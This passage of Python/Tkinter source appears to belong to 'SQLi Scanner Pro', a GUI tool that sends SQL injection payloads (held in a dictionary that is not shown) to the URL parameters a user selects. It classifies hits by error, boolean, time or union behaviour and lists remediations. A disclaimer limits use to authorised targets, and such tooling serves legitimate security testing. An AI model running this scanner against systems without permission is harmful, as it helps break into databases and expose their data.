            ("dim","  http://testphp.vulnweb.com/product.php?pic=1\n\n"),
            ("h2","WHY DID MY SCAN SHOW 0 VULNS ON VULNWEB?\n"),
            ("warn","  testphp.vulnweb.com may be temporarily offline or patched.\n"),
            ("warn","  Use the built-in demo server instead — it always works!\n\n"),
            ("h2","LEGAL DISCLAIMER\n"),
            ("warn","  Only test targets you OWN or have WRITTEN PERMISSION to test.\n"),
            ("warn","  Unauthorized testing is illegal everywhere.\n\n"),
            ("h2","DETECTION METHODS\n"),
            ("dim","  Error-Based   - DB error messages in HTML response\n"),
            ("dim","  Boolean-Based - TRUE vs FALSE content-length difference\n"),
            ("dim","  Time-Based    - Response delay (SLEEP / WAITFOR)\n"),
            ("dim","  Union-Based   - Leaked data keywords in response\n"),
        ]
        for tag, text in lines:
            t.insert("end", text, tag)
        t.config(state="disabled")

    def _build_statusbar(self):
        sb = tk.Frame(self.root, bg=BG_PANEL, height=24)
        sb.pack(fill="x", side="bottom")
        tk.Frame(sb, bg=ACCENT, height=1).pack(fill="x", side="top")
        inner = tk.Frame(sb, bg=BG_PANEL); inner.pack(fill="both", expand=True, padx=10)
        self.stat_lbl = tk.Label(inner, text="READY", font=("Courier New",8),
                                  bg=BG_PANEL, fg=ACCENT)
        self.stat_lbl.pack(side="left")
        tk.Label(inner,
                 text=f"SQLi Scanner Pro  |  Demo server: 127.0.0.1:{DEMO_PORT}  |  Educational use only",
                 font=("Courier New",8), bg=BG_PANEL, fg=TEXT_MUT).pack(side="right")

    def _log(self, tag, msg):
        self.log.config(state="normal")
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        if tag not in ("hdr",):
            self.log.insert("end", f"[{ts}] ", "time")
        self.log.insert("end", msg, tag)
        self.log.see("end")
        self.log.config(state="disabled")

    def _detect_params(self):
        url = self.url_var.get().strip()
        params = dict(urllib.parse.parse_qsl(urlparse(url).query))
        for w in self.param_frame.winfo_children(): w.destroy()
        self.param_rows.clear()
        if not params:
            tk.Label(self.param_frame, text="  No parameters found",
                     font=("Courier New",8), bg=BG_CARD, fg=ACCENT3).pack(pady=4)
            return
        for name, val in params.items():
            row = tk.Frame(self.param_frame, bg=BG_CARD); row.pack(fill="x", pady=1)
            tk.Label(row, text=name, font=("Courier New",8), bg=BG_CARD,
                     fg=ACCENT2, width=14, anchor="w").pack(side="left", padx=6)
            var = tk.BooleanVar(value=True)
            tk.Checkbutton(row, variable=var, bg=BG_CARD,
                           activebackground=BG_CARD, selectcolor=BG_PANEL,
                           relief="flat").pack(side="left")
            tk.Label(row, text=val[:20], font=("Courier New",7),
                     bg=BG_CARD, fg=TEXT_DIM).pack(side="left", padx=4)
            self.param_rows.append((name, var))
        self._log("info", f"  Detected {len(params)} param(s): {', '.join(params.keys())}\n")

    def _add_manual(self):
        row = tk.Frame(self.param_frame, bg=BG_CARD); row.pack(fill="x", pady=1)
        e = tk.Entry(row, font=("Courier New",8), bg=BG_PANEL, fg=ACCENT2,
                     relief="flat", width=14, insertbackground=ACCENT)
        e.pack(side="left", padx=6, ipady=3); e.insert(0,"param")
        var = tk.BooleanVar(value=True)
        tk.Checkbutton(row, variable=var, bg=BG_CARD,
                       activebackground=BG_CARD, selectcolor=BG_PANEL,
                       relief="flat").pack(side="left")
        self.param_rows.append((e, var))

    def _start_scan(self):
        url = self.url_var.get().strip()
        if not url.startswith("http"):
            messagebox.showerror("Invalid URL","Please enter a valid HTTP(S) URL."); return
        if not self.param_rows:
            messagebox.showwarning("No Params","Click [*] Auto-Detect Params first."); return
        cats = [c for c,v in self.cat_vars.items() if v.get()]
        if not cats:
            messagebox.showwarning("No Categories","Select at least one category."); return
        params = []
        for item in self.param_rows:
            name = item[0] if isinstance(item[0],str) else item[0].get().strip()
            if item[1].get() and name: params.append(name)
        if not params:
            messagebox.showwarning("No Params","Enable at least one parameter."); return

        self.stop_evt.clear()
        self.findings.clear()
        self.done = self.n_vulns = 0
        self.total = sum(len(PAYLOADS[c]) for c in cats) * len(params)
        for sv,v in [(self.sv_total,str(self.total)),(self.sv_done,"0"),
                     (self.sv_vulns,"0"),(self.sv_status,"SCANNING")]:
            sv.set(v)
        self.prog_var.set(0); self.pct_lbl.config(text="0%")
        for i in self.tree.get_children(): self.tree.delete(i)
        self.log.config(state="normal"); self.log.delete("1.0","end")
        self.log.config(state="disabled")

        self._log("hdr","="*68+"\n")
        self._log("hdr",f"  SCAN STARTED: {url}\n")
        self._log("hdr","="*68+"\n")
        self._log("info",f"  Parameters : {', '.join(params)}\n")
        self._log("info",f"  Categories : {', '.join(cats)}\n")
        self._log("info",f"  Total Tests: {self.total}\n\n")

        self.scan_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.t0 = time.time()
        threading.Thread(target=self._worker, args=(url,params,cats), daemon=True).start()

    def _worker(self, url, params, cats):
        baseline_body, _, bt = self.engine.fetch(url)
        for param in params:
            if self.stop_evt.is_set(): break
            self.engine.scan_param(url, param, cats, baseline_body, bt,
                                   callback=lambda r: self.q.put(r),
                                   stop_evt=self.stop_evt,
                                   delay=self.delay_var.get(),
                                   timeout=self.timeout_var.get())
        self.q.put(None)

    def _stop_scan(self):
        self.stop_evt.set()
        self.sv_status.set("STOPPING")

    def _drain_loop(self):
        try:
            while True:
                item = self.q.get_nowait()
                if item is None: self._finish()
                else: self._process(item)
        except queue.Empty: pass
        self.root.after(60, self._drain_loop)

    def _process(self, r):
        self.done += 1
        pct = (self.done / max(self.total,1)) * 100
        self.sv_done.set(str(self.done))
        self.prog_var.set(pct); self.pct_lbl.config(text=f"{pct:.0f}%")
        if r["vulnerable"]:
            self.n_vulns += 1
            self.sv_vulns.set(str(self.n_vulns))
            self.findings.append(r)
            sev = "HIGH" if r["confidence"]>=85 else ("MEDIUM" if r["confidence"]>=70 else "LOW")
            self.tree.insert("","end",
                values=(sev,r["param"],r["vuln_type"],f"{r['confidence']}%",
                        r["payload"][:50],r["details"]),
                tags=(sev,))
            self._log("vuln",f"  *** VULNERABLE! [{sev}] param={r['param']} -> {r['vuln_type']}\n")
            self._log("pay", f"     Payload   : {r['payload']}\n")
            self._log("warn",f"     Details   : {r['details']}\n")
            self._log("info",f"     Confidence: {r['confidence']}%  |  {r['elapsed']:.2f}s\n\n")
            self.nb.select(1)
        else:
            if self.done % 8 == 0:
                self._log("safe",f"  ok  {r['param']} <- {r['payload'][:38]}... safe\n")

    def _finish(self):
        elapsed = time.time() - self.t0
        self.sv_status.set("COMPLETE")
        self.scan_btn.config(state="normal"); self.stop_btn.config(state="disabled")
        self.prog_var.set(100); self.pct_lbl.config(text="100%")
        self.stat_lbl.config(text="COMPLETE", fg=ACCENT)
        self._log("hdr","\n"+"="*68+"\n")
        self._log("hdr","  SCAN COMPLETE\n")
        self._log("info",f"  Duration  : {elapsed:.1f}s\n")
        self._log("info",f"  Tests Run : {self.done}\n")
        if self.n_vulns:
            self._log("vuln",f"  Vulns Found: {self.n_vulns}  *** CHECK FINDINGS TAB\n")
        else:
            self._log("info","  Vulns Found: 0 - No issues detected\n")
        self._log("hdr","="*68+"\n")
        self._update_analysis(elapsed)

    def _update_analysis(self, elapsed):
        self.cv["tests"].set(str(self.done))
        self.cv["vulns"].set(str(self.n_vulns))
        high = sum(1 for f in self.findings if f["confidence"]>=85)
        med  = sum(1 for f in self.findings if 70<=f["confidence"]<85)
        self.cv["high"].set(str(high)); self.cv["medium"].set(str(med))
        self.cv["params"].set(str(len(set(f["param"] for f in self.findings))))
        self.cv["time"].set(f"{elapsed:.1f}s")
        t = self.ana; t.config(state="normal"); t.delete("1.0","end")
        t.insert("end","  SCAN RESULTS SUMMARY\n","h1")
        t.insert("end","  "+"─"*58+"\n\n","dim")
        if not self.findings:
            t.insert("end","  No SQL injection vulnerabilities detected.\n\n","h2")
            t.insert("end","  Target appears clean against the tested payloads.\n","dim")
        else:
            t.insert("end",f"  {self.n_vulns} vulnerabilities confirmed!\n\n","red")
            for f in self.findings:
                sev = "HIGH" if f["confidence"]>=85 else ("MEDIUM" if f["confidence"]>=70 else "LOW")
                t.insert("end",f"  [{sev}] ","red" if sev=="HIGH" else "amb")
                t.insert("end",f"Param: {f['param']}  |  {f['vuln_type']}\n")
                t.insert("end",f"         {f['payload'][:60]}\n","dim")
                t.insert("end",f"         {f['details']}\n\n","dim")
        t.insert("end","  REMEDIATIONS\n","h2")
        for r in ["Use parameterized queries / prepared statements",
                  "Validate & sanitize all user inputs server-side",
                  "Apply least-privilege DB account permissions",
                  "Deploy a Web Application Firewall (WAF)",
                  "Hide detailed DB errors from end-users"]:
            t.insert("end",f"  - {r}\n","dim")
        t.config(state="disabled")

    def _tree_sel(self, _):
        sel = self.tree.selection()
        if not sel: return
        idx = self.tree.index(sel[0])
        if idx < len(self.findings):
            f = self.findings[idx]
            self.det.config(state="normal"); self.det.delete("1.0","end")
            self.det.insert("end",
                f"Full URL  : {f['url']}\n"
                f"Parameter : {f['param']}\n"
                f"Payload   : {f['payload']}\n"
                f"Vuln Type : {f['vuln_type']}\n"
                f"Confidence: {f['confidence']}%\n"
                f"HTTP {f['status']}  |  {f['elapsed']:.3f}s\n"
                f"Details   : {f['details']}\n")
            self.det.config(state="disabled")

    def _export(self):
        if not self.findings:
            messagebox.showinfo("No Findings","No vulnerabilities to export."); return
        path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON","*.json"),("All","*.*")],
            initialfile=f"sqli_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        if path:
            with open(path,"w") as fp:
                json.dump({"scan_date":datetime.datetime.now().isoformat(),
                           "target":self.url_var.get(),
                           "total_tests":self.done,
                           "vulnerabilities":self.findings},fp,indent=2)
            messagebox.showinfo("Exported",f"Saved to:\n{path}")

    def _clear(self):
        self.log.config(state="normal"); self.log.delete("1.0","end")
        self.log.config(state="disabled")
        for i in self.tree.get_children(): self.tree.delete(i)
        self.findings.clear()
        self.done = self.n_vulns = self.total = 0
        for sv,v in [(self.sv_total,"0"),(self.sv_done,"0"),
                     (self.sv_vulns,"0"),(self.sv_status,"IDLE")]:
            sv.set(v)
        self.prog_var.set(0); self.pct_lbl.config(text="0%")
        self._log("info","Cleared.\n")


if __name__ == "__main__":
    root = tk.Tk()
    App(root)
    root.mainloop()
